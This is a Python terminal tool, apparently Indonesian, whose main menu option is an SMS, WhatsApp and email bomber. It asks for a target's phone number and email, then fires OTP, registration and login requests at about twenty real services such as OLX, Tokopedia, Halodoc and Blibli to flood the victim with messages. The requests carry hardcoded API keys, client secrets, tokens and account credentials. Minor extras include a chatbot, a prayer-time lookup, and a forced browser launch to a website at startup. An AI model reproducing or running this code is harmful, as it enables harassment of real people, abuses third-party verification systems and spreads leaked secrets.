import os,sys,time,requests,json
import re,colorama,random
from requests import get,post
from colorama import Fore,Back,init
B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
biru="\033[1;96m"
#Tulisan Background Merah
id = []
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' 
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
warna = random.choice([
'\x1b[1;91m',
'\x1b[1;92m',
'\x1b[1;93m',
'\x1b[1;94m',
'\x1b[1;95m',
'\x1b[1;96m'
])

def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)

def webbucin():
    os.system("cd setup && bash html-x.sh")
    tanya()
def simbot():
    try:
        os.system("clear")
        time.sleep(3)
        banner()
        nalu=input(f"{putih}[{kuning}•{putih}] Nama Kamu {R}:{G} ")
        nabot=input(f"{putih}[{kuning}•{putih}] Nama Bot {R}:{G} ")
        print (f"{putih}Press {biru}CTRL C {putih}to Stop\n")
        while True:
            kamu=input(f"{W}{nalu} {R}:{Y} ")
            url = (f'https://api.simsimi.net/v2/?text={kamu}&lc=id')
            respon=requests.get(url)
            if respon.status_code == 200:
                print (f"{W}{nabot} {R}:{G} ",respon.json().get('success'))
            else:
                print (f"{putih}[{biru}System{putih}] Bad Respons {R}!!{W}")
    except KeyboardInterrupt:
        print (f"{putih}[{biru}System{putih}] CTRL C Detect Exited With Program")

def tanya():
    d=input(f"{putih}Main Lagi {biru}({putih}y/n{biru}){R}:{Y} ")
    if d == "y" or d == "Y":
        print (f"{putih}[{biru}System{putih}] Please Wait....")
        time.sleep(5)
        banner()
        main()
    if d == "n" or d == "D":
        print (f"{putih}[{biru}System{putih}] Thx For Using My Tools\n{putih}[{biru}System{putih}] Exited With Program...")
        time.sleep(5)

def sholat_bree():
	try:
		kota = input(f'{W}[{Y}•{W}] Nama Kota{R}:{G} ')
		tgl = input(f"{W}[{Y}•{W}] Sekarang Tanggal{R}:{G}")
		thn = input(f"{W}[{Y}•{W}] Sekarang Tahun{R}:{G}")
		bln = input(f"{W}[{Y}•{W}] Sekarang Bulan ke{R}:{G}")
		print()
		respon = requests.get('https://api.myquran.com/v1/sholat/kota/cari/%s' % (kota)).text
		respon1 = json.loads(respon)
		for respon2 in respon1['data']:
			try:
				print(f'{W}[{Y}•{W}] \x1b[1;97mLokasi \x1b[1;91m: \x1b[1;97m%s \x1b[1;91m| \x1b[1;97mid \x1b[1;91m: \x1b[1;92m%s ' % (respon2['lokasi'],respon2['id']))
				id.append(respon2['id'])
			except:continue
		print(f'{W}[{Y}•{W}] \x1b[1;97mTotal id \x1b[1;91m: \x1b[1;92m%s' % (len(id)))
		print(f'\n{W}[{Y}•{W}] \x1b[1;97mPilih Id Di Atas Dan Masukan id di bawah')
		cek_kota = input(f'{W}[{Y}•{W}] \x1b[1;97mMasukan Id\x1b[1;91m:\x1b[1;92m ')
		respon3 = requests.get('https://api.myquran.com/v1/sholat/jadwal/%s/2022/03/24' % (cek_kota)).text
		respon4 = json.loads(respon3)['data']
		print(f'{W}[{Y}•{W}] %sId       %s: %s%s' % (P,M,H,respon4['id']))
		print(f'{W}[{Y}•{W}] %sLokasi   %s: %s%s' % (P,M,H,respon4['lokasi']))
		print(f'{W}[{Y}•{W}] %sProvinsi %s: %s%s' % (P,M,H,respon4['daerah']))
		respon4 = requests.get(f'https://api.myquran.com/v1/sholat/jadwal/%s/{thn}/{bln}/{tgl}' % (cek_kota)).text
		respon5 = json.loads(respon4)['data']['jadwal']
		print(f'{W}[{Y}•{W}] %sTanggal  %s: %s%s' % (P,M,H,respon5['tanggal']))
		print(f'{W}[{Y}•{W}] %sImsak    %s: %s%s' % (P,M,H,respon5['imsak']))
		print(f'{W}[{Y}•{W}] %sSubuh    %s: %s%s' % (P,M,H,respon5['subuh']))
		print(f'{W}[{Y}•{W}] %sTerbit   %s: %s%s' % (P,M,H,respon5['terbit']))
		print(f'{W}[{Y}•{W}] %sDhuha    %s: %s%s' % (P,M,H,respon5['dhuha']))
		print(f'{W}[{Y}•{W}] %sDzuhur   %s: %s%s' % (P,M,H,respon5['dzuhur']))
		print(f'{W}[{Y}•{W}] %sAshar    %s: %s%s' % (P,M,H,respon5['ashar']))
		print(f'{W}[{Y}•{W}] %sMaghrib  %s: %s%s' % (P,M,H,respon5['maghrib']))
		print(f'{W}[{Y}•{W}] %sIsya     %s: %s%s' % (P,M,H,respon5['isya']))
		print(f'{W}[{Y}•{W}] %sDate     %s: %s%s' % (P,M,H,respon5['date']))
		print()
		tanya()
	except KeyError:
		print (f"{putih}[{biru}System{putih}] Key Eror{Y}:{putih} Invalid Key !")
		sys.exit()
	except KeyboardInterrupt:
		print (f"{putih}[{biru}System{putih}] CTRL C Detect Exited With Program")

def spam():
    try:
        localtime=time.asctime(time.localtime(time.time()))
        banner()
        nomor=input(f"{putih}[{biru}~{putih}] Nomor Target {R}:{Y} ")
        c=input(f"{putih}[{biru}~{putih}] Gmail Targt {R}:{G} ")
        AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
        pos=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})).text
        requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
        dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
        jenius=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
        payfaz=requests.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":"0"+nomor},headers={"Host": "api.payfazz.com", "content-length": "17", "accept": "*/*", "origin": "https://www.payfazz.com","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "http://www.payfazz.com/register/BEN6ZF74XL", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
        req4 = requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers={'Host': 'www.halodoc.com','x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json, text/plain, */*','save-data': 'on','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"phone_number": "+62"+nomor,"channel": "sms"})).text
        req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
        pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
        mar=requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"captcha":""})).text
        gaskeun=requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
        gine=requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
        aladin=requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
        bli=requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+nomor,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text
        autoketik(f"{putih}[{biru}System{putih}] Success Sending Spam Sms to time {Y}{localtime}")
        req=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor})).text
        gw=requests.get("https://m.redbus.id/api/getOtp?number="+nomor+"&cc=62&whatsAppOpted=true&disableOtpFlow=undefined",headers={"Host":"m.redbus.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}).text
        site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text
        search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
        sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',})
        req=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
        shope=requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},json={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}).text
        reqw=requests.post("https://passport-api.orami.co.id/api/otp/send/",headers={"Host":"passport-api.orami.co.id","content-length":"46","accept":"application/json, text/plain, */*","content-type":"application/json","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://passport.orami.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://passport.orami.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"+62"+nomor,"method":"whatsapp"})).text
        pos=requests.post("https://gaia.mysirclo.id/graphql",headers={"Host":"gaia.mysirclo.id","Connection":"keep-alive","Content-Length":"280","accept":"*/*","content-type":"application/json","sec-ch-ua-mobile":"?0","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","Origin":"https://store.sirclo.com","Sec-Fetch-Site":"cross-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://store.sirclo.com/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"requestPhoneOtp","variables":{"input":{"brandId":"dummy","subject":"0"+nomor,"taskId":"admin-phone-register"}},"query":"mutation requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"})).text
        pos=requests.post("https://tokotalk-api.eks.codebrick.io/v1/no_auth/verifications",headers={"Host":"tokotalk-api.eks.codebrick.io","Connection":"keep-alive","Content-Length":"110","Accept":"application/json, text/plain, */*","Content-Type":"application/json","sec-ch-ua-mobile":"?0","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","Origin":"https://tokoadmin.tokotalk.com","Sec-Fetch-Site":"cross-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://tokoadmin.tokotalk.com/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"optional":"2ca871a4375bd0af28d6381376167418","key":"phone","preferredMethod":"wa","value":"+620"+nomor})).text
        gas=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko","sec-ch-ua-platform":"Linux","origin":"https://web.tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
        req=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor})).text
        autoketik(f"{putih}[{biru}System{putih}] Success Sending Spam Wa to time {Y}{localtime}")
        gas=requests.post("https://www.olx.co.id/api/auth/authenticate",headers={"Host":"www.olx.co.id","content-length":"68","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","sec-ch-ua-mobile":"?1","x-panamera-fingerprint":"f2af53ad265f38e9644f7955d158dc11#1657907659777","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","sec-ch-ua-platform":"Android","origin":"https://www.olx.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"grantType":"email","email":c,"language":"id"})).text
        time.sleep(2)
        gas=requests.post("https://www.olx.co.id/api/auth/authenticate",headers={"Host":"www.olx.co.id","content-length":"68","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","sec-ch-ua-mobile":"?1","x-panamera-fingerprint":"f2af53ad265f38e9644f7955d158dc11#1657907659777","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","sec-ch-ua-platform":"Android","origin":"https://www.olx.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"grantType":"email","email":c,"language":"id"})).text
        time.sleep(2)
        gas=requests.post("https://www.olx.co.id/api/auth/authenticate",headers={"Host":"www.olx.co.id","content-length":"68","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","sec-ch-ua-mobile":"?1","x-panamera-fingerprint":"f2af53ad265f38e9644f7955d158dc11#1657907659777","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","sec-ch-ua-platform":"Android","origin":"https://www.olx.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"grantType":"email","email":c,"language":"id"})).text
        time.sleep(2)
        gas=requests.post("https://www.olx.co.id/api/auth/authenticate",headers={"Host":"www.olx.co.id","content-length":"68","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","sec-ch-ua-mobile":"?1","x-panamera-fingerprint":"f2af53ad265f38e9644f7955d158dc11#1657907659777","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","sec-ch-ua-platform":"Android","origin":"https://www.olx.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"grantType":"email","email":c,"language":"id"})).text
        time.sleep(2)
        autoketik(f"{putih}[{biru}System{putih}] Success Sending Spam Gmail to time {Y}{localtime}")
        tanya()
    except KeyboardInterrupt:
        print (f"{putih}[{biru}System{putih}] CTRL C Detect Exited With Program")

bg="\033[1;0m\033[1;41mText\033[1;0m"
def banner():
    os.system("clear")
    autoketik (f"""
{R}[[[[[[[[[[[[[[[[[[[[[[[[ {putih}| {Y}»{putih} Penbuat sc {R}:{Y}Ammar Executed
{R}[[[[[[[[[[[[[[[[[[[[[[[[ {putih}| {Y}»{putih} Githubb {R}:{G} github.com/tutur14l
{W}[[[[[[[[[[[[[[[[[[[[[[[[ {putih}| {Y}»{putih} Youtube {R}:{Y} tutur14l
{W}[[[[[[[[[[[[[[[[[[[[[[[[ {putih}| {Y}»{putih} Youtube {R}:{biru} Ammar Executed
""")
    print("\t"+Fore.RED+"       ["+Back.WHITE+Fore.BLACK+"Thx For Using My Tools Friend \033[00m"+Fore.RED+"]")
    print("")

def main():
    try:
        print (f"""{putih}1{R}.{putih}Start Spam {biru}({W}sms{R},{W}wa{R},{W}email{biru})
{putih}2{R}.{W}Chat Dengan {biru}Simbot
{putih}3{R}.{W}Jadwal Sholat
{putih}4{R}.{W}Download Web {Y}Bucin
{putih}5{R}.{W}Keluar/{R}Exit
""")
        a=input(f"{putih}[{ungu}?{putih}] Pilih Menu {R}:{Y} ")
        if a == "1":
            spam()
        if a == "2":
            simbot()
        if a == "3":
            sholat_bree()
        if a == "4":
            webbucin()
        if a == "5":
            print (f"{putih}[{biru}System{putih}] Program Exited Detect")
            time.sleep(3)
    except KeyboardInterrupt:
        print (f"{putih}[{biru}System{putih}] CTRL C Detect Exited With Program")

os.system("clear")
autoketik (f"{putih}[{biru}>{putih}] Subscribe Channel Saya dulu !!")
os.system("xdg-open https://www.newcraventeam.com/")
time.sleep(5)
autoketik (f"{putih}[{biru}>{putih}] Trimakasih sudah Subscriber")
